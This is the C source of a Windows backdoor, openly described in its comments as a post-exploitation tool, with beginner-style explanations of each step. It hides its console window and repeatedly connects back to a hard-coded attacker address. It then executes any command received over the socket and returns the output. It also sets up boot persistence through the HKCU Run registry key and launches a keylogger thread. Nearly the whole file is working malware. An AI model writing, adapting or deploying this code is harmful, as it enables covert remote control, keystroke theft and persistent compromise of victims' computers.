//Windows Program Main Function File

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //to include all the .h header libraries
#include <winsock2.h> //for socket programming to establish connection with server
#include <windows.h> //to use windows specific programs
#include <winuser.h> //will be used to interact with the programs
#include <wininet.h> //will be used to interact with the programs
#include <windowsx.h> //will be used to interact with the programs
#include <string.h> //manipulate strings in the program	
#include <sys/stat.h> //to get information about file attributes
#include <sys/types.h> //to interact with the files for various options
#include "keylogger.h" //attaching the keylogger program


#define bzero(p, size) (void) memset((p), 0, (size)) /*p is the parameter(buffer/container/total_response, size is the size of the param, 0 is the initial size we are allocating to the parameters */
int sock; //a global variable

int bootRun(){
	char err[128] = "Failed\n";
	char succ[128] = "Persistence Created at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH]; //a Windows32 bit char string that be used to describe a unicode string
	DWORD pathLen = 0; //short for Double word and is a data type of unsigned 32bit unit data, having integer value.
	
	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0){
		send(sock, err, sizeof(err), 0); //sending socket obj the err
		return -1;
	}
	
	HKEY NewVal; //creating a reg key value to be able to access the keys
		
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(NewVal, TEXT("Hacked."),0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	
	RegCloseKey(NewVal);
	send(sock, succ, sizeof(succ), 0);
	return 0;	
}


/*
The entire code block of the str_cut function is performing the action of cutting a part of a string. We call this fn from the Shell fn, to cut some part of the input string in the buffer variable, and then sending it forward to perform some action. Here, we cut the string to be able to perform 'cd-change dir' command along with other commands in the if-else block below in the Shell function.
*/
char *
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}


/* --------------------Here begins the Shell function where we are performing all the post-exploited attack commands----------------- */
void Shell()
{
	char buffer[1024]; //to receive commands from the server sent by the attacker. Commands like deleting/copying a file etc. will be stored in this buffer.
	char container[1024]; //
	char total_response[18384]; //
	
	while (1) //iterates forever until a specific task is fullfilled
	{
		jump:
		//now allocating 0 to the values of the above 3 variables
		/*we can use memset(windows fn) but we will use bzero(linux fn to set the all the socket structs to null values) which we have to define it in a windows machine.*/
		bzero(buffer,1024); //either write the size of the fn this way
		bzero(container, sizeof(container)); //or write it using sizeof fn, which is a good practice of writing code
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0); //the first thing that the program will do is to receive commands from the server
		
		if (strncmp("bye", buffer, 3) == 0){ //simply close the socket obj and exit the program
		//string compare takes 3 arguments in c
		// #1 The string that we are comparing.
		// #2 The variable that we are comparing the string with.
		// #3 How many characters are we comparing.
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		
		else if (strncmp("cd ", buffer, 3) == 0){
			chdir(str_cut(buffer, 3, 100));
		}
		
		else if (strncmp("persist", buffer, 7) == 0){
			bootRun();
		}
		
		else if (strncmp("init-key", buffer, 8) == 0){ 
		/*when we input this command from our server, it gets sent to the backdoor, and the backdoor will compare the 'initiate_keylog' with the buffer and it notices that both the strings are same. So it will start running the keylogger program. */
			HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL); //creating a thread as we want to run the keylogger program in the bg.
			goto jump; //jumping back to the while loop and waiting for the next set of commands.
		}
		
		else{ //if any other command if entered then that is supposed to be run
			FILE *fp; //using File descriptors to point to a specific memory
			fp = _popen(buffer, "r");  /*command inside the buffer is executed in this line and also storing the response in the fp file descriptor. POPEN fn takes two commands,*/
			//to open a file as a process
			//2 params - First, buffer to read the user entered command from; Second, is a string "r" which says Read the Buffer and execute it.
			
			//once the data from stored in the fp is read, we need to store it inside the container which is of the size 1024 bytes
			while(fgets(container,1024,fp) != NULL) { 
			//here, we are checking if the response can fit in 1024 bytes of the container variable
			//we use while and fgets to get 1024 bytes from the file descriptor fp, inside the container variable.
			//we read from the fp f.descriptor and store the value inside the container for attacker's use.
			/*no we also want a response from the computer to send it back to the server. Fgets will get the string from another variable to a different variable.*/
				strcat(total_response, container);
				/*since the entered command/response can be larger than the size of the container (>1024 bytes), we are adding the rest of the response in the total_response.*/
				//Example - Response 1 = abcd, Container = abcd, Total Response = abcd
				//	    Response 2 = efgh, Container = efgh, Total Response = abcdefgh
				// since the sizeof(total_response) is way larger, it can store all the responses and send them back to ther server.
			}
			send(sock, total_response, sizeof(total_response), 0); //sending the response to the server using the sock variable.
			fclose(fp); //closing the file descriptor
		}
	}
}

//every windows program includes an entry point fn and APIENTRY to access different fns
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdline, int nCmdShow)
/* #RULES
 #1 nCmdShow is an Anonymity flag that says if the Main Application will be maxi/minimized or shown normally, which is the first thing that is done in this function.
 #2 The value of a Handle to an instance/module is used by the OS to identify the executable file, when it's loaded in the memory.
 #3 lpCmdline contains CMD line arguments like a unicode string
 #4 hPrev was used in 16bit OSs and just used to be compatible with the windows API. Its value is 0.
*/
{
	HWND stealth; //now the application window will NOT be visible to the target. Stealth variable is the Handle to our Window.
	AllocConsole(); //a fn that allocates a new console on the attacker's pc, to the calling process everytime the Application is executed.
	
	stealth = FindWindowA("ConsoleWindowClass", NULL); 
	//a function from winuser.h that retrieves a handle to the top level window.
	//this fn uses two arguments where first one is a classname and other is the window name which we defined to be NULL.
	
	ShowWindow(stealth,0); 
	//A fn that decides whether to show the window to the program or not.
	//uses two arguments- Handle instance ie. stealth, nCmdShow ie. 0 to hiding the window and activating another window.
	
	
	/* Below variables are created for Socket Connection Establishment */
	struct sockaddr_in ServAddr; //defining the actual server address
	unsigned short ServPort; //we're using these two variables cuz we require an IP Add and a port to connect to, from our backdoor.
	char *ServIP; //pointer pointing to the memory address of ServIP.
	WSADATA wsaData; 
	/*
	A struct that contains info about the Windows sockets, is required to establish a socket connection to target windows machine.
	WSADATA is a data structure used by the WSAStartup fn whose return type is an integer. 
	WSAStartup fn specifies the version of Windows Sockets (winsock2.h) required and to set-up all the things that the application needs to use sockets.
	https://stackoverflow.com/questions/4991967/how-does-wsastartup-function-initiates-use-of-the-winsock-dll
	*/
	
	ServIP = "192.168.1.8"; //the IP of the attacker's machine which will listen to the connections coming from the backdoor.
	ServPort = 50005; //random free port to listen to the connections.
	
	
	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) //if successful it will return 0
	{
		exit(1); //exit the program straightaway if result != 0
	}
	
	sock = socket(AF_INET, SOCK_STREAM, 0);
	//defining the socket object
	//AF_INET defines that the connection is established over IPv4
	//SOCK_STREAM defines that its a TCP conn or a 3-way-handshake conn to establish a connection b/w server and target
	
	/* Defining the parameters that the ServAddr will take, as it is a part of a structure sockaddr_in */
	memset(&ServAddr, 0, sizeof(ServAddr)); 
	//clears the variables with 0's
	// if ServAddr variable value is "42069" -> "00000"
	ServAddr.sin_family = AF_INET; //PARAMETER 1 ie. IPv4 conn
	ServAddr.sin_addr.s_addr = inet_addr(ServIP); /*PARAMETER 2 ie. IP Addr of the server is accessed by inet_addr fn, as we can't use the string "192.168.1.15"*/
	ServAddr.sin_port = htons(ServPort); //PARAMETER 3 ie. to assign the value of the Port, using the htons fn, as we can't use the integer 50006
	
	/*performing a connection*/
	//Here, if the connection is setup the while loop wont run, else the loop will try to connect to the server after every 10s of sleep.
	start: //this start jump-point is called in the Void Shell function.
	while (connect(sock,(struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
		goto start;
	}
	Shell();	
}
